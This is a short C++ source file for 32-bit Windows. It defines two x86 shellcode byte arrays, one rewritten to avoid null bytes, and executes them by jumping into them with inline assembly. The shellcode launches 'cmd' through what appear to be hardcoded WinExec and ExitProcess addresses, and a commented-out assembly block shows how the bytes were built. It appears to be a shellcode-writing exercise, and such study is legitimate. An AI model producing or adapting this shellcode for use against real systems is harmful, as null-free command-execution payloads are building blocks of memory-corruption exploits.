#include <iostream>
#include <Windows.h>
#include <cstdio>
char shellcode[] =
"\xC6\x45\xFC\x63"
"\xC6\x45\xFD\x6D"
"\xC6\x45\xFE\x64"
"\xC6\x45\xFF\x00"
"\x6A\x05"
"\x8D\x45\xFC"
"\x50"
"\xB8\xB0\xDA\xEF\x74"
"\xFF\xD0"
"\x8B\xF4"
"\x6A\x01"
"\xB8\x90\x59\xEC\x74"
"\xFF\xD0";
char shellcode_02[] = //nullbyte removed
"\x33\xDB"
"\x89\x5D\xFC"
"\xC6\x45\xFC\x63"
"\xC6\x45\xFD\x6D"
"\xC6\x45\xFE\x64"
"\x6A\x05"
"\x8D\x45\xFC"
"\x50"
"\xB8\xB0\xDA\xEF\x74"
"\xFF\xD0"
"\x8B\xF4"
"\x6A\x01"
"\xB8\x90\x59\xEC\x74"
"\xFF\xD0";
int main(int argc, char* argv[])
{
    int* shell = (int*)shellcode_02;
 /*
    __asm {
        xor         ebx,ebx
        mov         [ebp-4],ebx
        mov         byte ptr[ebp-4], 63h
        mov         byte ptr[ebp -3], 6Dh
        mov         byte ptr[ebp - 2], 64h
       // null byte remove-> mov         byte ptr[ebp - 1], 0
       
        push        5
        lea         eax, [ebp-4]
        push        eax
        mov         eax, 0x74efdab0
        call        eax


        mov         esi, esp
        push        1
        mov         eax, 0x74ec5990
        call        eax
   
    }*/

    __asm {
        jmp shell

    }
}
